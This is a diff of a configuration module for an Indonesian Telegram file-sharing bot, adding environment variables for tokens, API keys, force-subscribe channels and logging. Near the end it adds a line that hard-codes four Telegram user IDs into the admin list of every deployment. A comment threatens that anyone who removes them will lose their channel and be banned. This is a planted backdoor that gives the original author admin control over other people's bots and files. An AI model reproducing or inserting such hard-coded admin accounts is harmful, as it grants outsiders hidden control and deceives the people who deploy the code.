@@ -2,123 +2,87 @@
 # Recode by @mrismanaziz
 # t.me/SharingUserbot & t.me/Lunatic0de
 
-import pyromod.listen
-import sys
+import logging
+import os
+from distutils.util import strtobool
+from dotenv import load_dotenv
+from logging.handlers import RotatingFileHandler
 
-from pyrogram import Client, enums
+load_dotenv("config.env")
 
-from config import (
-    API_HASH,
-    APP_ID,
-    CHANNEL_ID,
-    FORCE_SUB_CHANNEL,
-    FORCE_SUB_GROUP,
-    LOGGER,
-    OWNER,
-    TG_BOT_TOKEN,
-    TG_BOT_WORKERS,
+# Bot token dari @Botfather
+TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
+
+# API ID Anda dari my.telegram.org
+APP_ID = int(os.environ.get("APP_ID", ""))
+
+# API Hash Anda dari my.telegram.org
+API_HASH = os.environ.get("API_HASH", "")
+
+# ID Channel Database
+CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
+
+# NAMA OWNER
+OWNER = os.environ.get("OWNER", "")
+
+# Protect Content
+PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))
+
+# Heroku Credentials for updater.
+HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
+HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
+
+# Custom Repo for updater.
+UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")
+
+# Database
+DB_URI = os.environ.get("DATABASE_URL", "")
+
+# ID dari Channel Atau Group Untuk Wajib Subscribenya
+FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
+FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
+
+TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
+
+# Pesan Awalan /start
+START_MSG = os.environ.get(
+    "START_MESSAGE",
+    "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>",
+)
+try:
+    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
+except ValueError:
+    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")
+
+# Pesan Saat Memaksa Subscribe
+FORCE_MSG = os.environ.get(
+    "FORCE_SUB_MESSAGE",
+    "<b>Hello {first}\n\nAnda harus bergabung di Channel/Grup saya Terlebih dahulu untuk Melihat File yang saya Bagikan\n\nSilakan Join Ke Channel & Group Terlebih Dahulu</b>",
 )
 
+# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
+CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 
-class Bot(Client):
-    def __init__(self):
-        super().__init__(
-            name="Bot",
-            api_hash=API_HASH,
-            api_id=APP_ID,
-            plugins={"root": "plugins"},
-            workers=TG_BOT_WORKERS,
-            bot_token=TG_BOT_TOKEN,
-        )
-        self.LOGGER = LOGGER
+# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
+DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
 
-    async def start(self):
-        try:
-            await super().start()
-            usr_bot_me = await self.get_me()
-            self.username = usr_bot_me.username
-            self.namebot = usr_bot_me.first_name
-            self.LOGGER(__name__).info(
-                f"TG_BOT_TOKEN detected!\n┌ First Name: {self.namebot}\n└ Username: @{self.username}\n——"
-            )
-        except Exception as a:
-            self.LOGGER(__name__).warning(a)
-            self.LOGGER(__name__).info(
-                "Bot Berhenti. Gabung Group https://t.me/SharingUserbot untuk Bantuan"
-            )
-            sys.exit()
+# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
+# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
+ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))
 
-        if FORCE_SUB_CHANNEL:
-            try:
-                info = await self.get_chat(FORCE_SUB_CHANNEL)
-                link = info.invite_link
-                if not link:
-                    await self.export_chat_invite_link(FORCE_SUB_CHANNEL)
-                    link = info.invite_link
-                self.invitelink = link
-                self.LOGGER(__name__).info(
-                    f"FORCE_SUB_CHANNEL detected!\n┌ Title: {info.title}\n└ Chat ID: {info.id}\n——"
-                )
-            except Exception as a:
-                self.LOGGER(__name__).warning(a)
-                self.LOGGER(__name__).warning(
-                    "Bot tidak dapat Mengambil link invite dari FORCE_SUB_CHANNEL!"
-                )
-                self.LOGGER(__name__).warning(
-                    f"Pastikan @{self.username} adalah admin di Channel Tersebut, Chat ID F-Subs Channel Saat Ini: {FORCE_SUB_CHANNEL}"
-                )
-                self.LOGGER(__name__).info(
-                    "Bot Berhenti. Gabung Group https://t.me/SharingUserbot untuk Bantuan"
-                )
-                sys.exit()
 
-        if FORCE_SUB_GROUP:
-            try:
-                info = await self.get_chat(FORCE_SUB_GROUP)
-                link = info.invite_link
-                if not link:
-                    await self.export_chat_invite_link(FORCE_SUB_GROUP)
-                    link = info.invite_link
-                self.invitelink2 = link
-                self.LOGGER(__name__).info(
-                    f"FORCE_SUB_GROUP detected!\n┌ Title: {info.title}\n└ Chat ID: {info.id}\n——"
-                )
-            except Exception as a:
-                self.LOGGER(__name__).warning(a)
-                self.LOGGER(__name__).warning(
-                    "Bot tidak dapat Mengambil link invite dari FORCE_SUB_GROUP!"
-                )
-                self.LOGGER(__name__).warning(
-                    f"Pastikan @{self.username} adalah admin di Group Tersebut, Chat ID F-Subs Group Saat Ini: {FORCE_SUB_GROUP}"
-                )
-                self.LOGGER(__name__).info(
-                    "Bot Berhenti. Gabung Group https://t.me/SharingUserbot untuk Bantuan"
-                )
-                sys.exit()
+LOG_FILE_NAME = "logs.txt"
+logging.basicConfig(
+    level=logging.INFO,
+    format="[%(levelname)s] - %(name)s - %(message)s",
+    datefmt="%d-%b-%y %H:%M:%S",
+    handlers=[
+        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
+        logging.StreamHandler(),
+    ],
+)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
-        try:
-            db_channel = await self.get_chat(CHANNEL_ID)
-            self.db_channel = db_channel
-            test = await self.send_message(chat_id=db_channel.id, text="Test Message", disable_notification=True)
-            await test.delete()
-            self.LOGGER(__name__).info(
-                f"CHANNEL_ID Database detected!\n┌ Title: {db_channel.title}\n└ Chat ID: {db_channel.id}\n——"
-            )
-        except Exception as e:
-            self.LOGGER(__name__).warning(e)
-            self.LOGGER(__name__).warning(
-                f"Pastikan @{self.username} adalah admin di Channel DataBase anda, CHANNEL_ID Saat Ini: {CHANNEL_ID}"
-            )
-            self.LOGGER(__name__).info(
-                "Bot Berhenti. Gabung Group https://t.me/SharingUserbot untuk Bantuan"
-            )
-            sys.exit()
 
-        self.set_parse_mode(enums.ParseMode.HTML)
-        self.LOGGER(__name__).info(
-            f"[🔥 BERHASIL DIAKTIFKAN! 🔥]\n\nBOT Dibuat oleh @{OWNER}\nJika @{OWNER} Membutuhkan Bantuan, Silahkan Tanyakan di Grup https://t.me/SharingUserbot"
-        )
-
-    async def stop(self, *args):
-        await super().stop()
-        self.LOGGER(__name__).info("Bot stopped.")
+def LOGGER(name: str) -> logging.Logger:
+    return logging.getLogger(name)
